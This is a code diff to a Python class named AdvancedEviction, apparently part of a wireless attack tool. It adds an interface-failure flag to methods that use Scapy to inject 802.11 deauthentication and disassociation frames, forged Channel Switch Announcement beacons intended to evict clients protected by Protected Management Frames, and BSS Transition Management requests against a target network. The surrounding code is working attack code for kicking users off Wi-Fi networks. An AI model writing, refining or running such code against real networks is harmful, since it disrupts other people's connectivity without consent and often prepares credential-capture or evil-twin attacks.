@@ -105,6 +105,9 @@ class AdvancedEviction:
         self.current_channel = current_channel
         self.target_ssid = target_ssid
         self.decoy_channel = 6 if current_channel == 1 else (1 if current_channel <= 14 else 36)
+        # Set True once the interface is gone/down; further injection calls
+        # then return 0 silently instead of spamming the same error in a loop.
+        self._iface_dead = False
 
     def send_deauth_burst(self, client_mac: Optional[str] = None, count: int = 3) -> int:
         """Send standard 802.11 Deauth + Disassoc frame burst (bidirectional for clients)."""
@@ -121,6 +124,8 @@ class AdvancedEviction:
                 RadioTap() / Dot11(addr1=self.target_bssid, addr2=dest, addr3=self.target_bssid) / Dot11Deauth(reason=7),
                 RadioTap() / Dot11(addr1=self.target_bssid, addr2=dest, addr3=self.target_bssid) / Dot11Disas(reason=8),
             ])
+        if self._iface_dead:
+            return 0
         try:
             sendp(frames, iface=self.interface, count=count, verbose=False)
             return count * len(frames)
@@ -131,7 +136,8 @@ class AdvancedEviction:
         except OSError as e:
             if "No such device" in str(e) or "Network is down" in str(e):
                 logger.error(f"Deauth injection FAILED: Interface {self.interface} is down or not in monitor mode")
-                print(f"\n\033[91m[!] Deauth FAILED: {self.interface} is down or not in monitor mode\033[0m")
+                print(f"\n\033[91m[!] Deauth FAILED: {self.interface} is down or not in monitor mode (stopping injection)\033[0m")
+                self._iface_dead = True
             else:
                 logger.error(f"Deauth injection OSError: {e}")
                 print(f"\n\033[91m[!] Deauth injection error: {e}\033[0m")
@@ -143,6 +149,8 @@ class AdvancedEviction:
 
     def send_csa_burst(self, target_channel: Optional[int] = None, count: int = 5) -> int:
         """Send Channel Switch Announcement (CSA) burst to evict PMF-protected clients."""
+        if self._iface_dead:
+            return 0
         ch = target_channel or self.decoy_channel
         beacon = build_csa_beacon(
             bssid=self.target_bssid,
@@ -161,7 +169,9 @@ class AdvancedEviction:
             return 0
         except OSError as e:
             logger.error(f"CSA injection OSError on {self.interface}: {e}")
-            print(f"\n\033[91m[!] CSA injection error: {self.interface} down or not in monitor mode\033[0m")
+            if "No such device" in str(e) or "Network is down" in str(e):
+                self._iface_dead = True
+            print(f"\n\033[91m[!] CSA injection error: {self.interface} down or not in monitor mode (stopping injection)\033[0m")
             return 0
         except Exception as e:
             logger.warning(f"CSA injection failed: {e}")
@@ -169,6 +179,8 @@ class AdvancedEviction:
 
     def send_btm_burst(self, client_mac: str, count: int = 2) -> int:
         """Send 802.11v BTM request to trigger client roaming."""
+        if self._iface_dead:
+            return 0
         req = build_btm_request(self.target_bssid, client_mac)
         try:
             sendp(req, iface=self.interface, count=count, verbose=False)
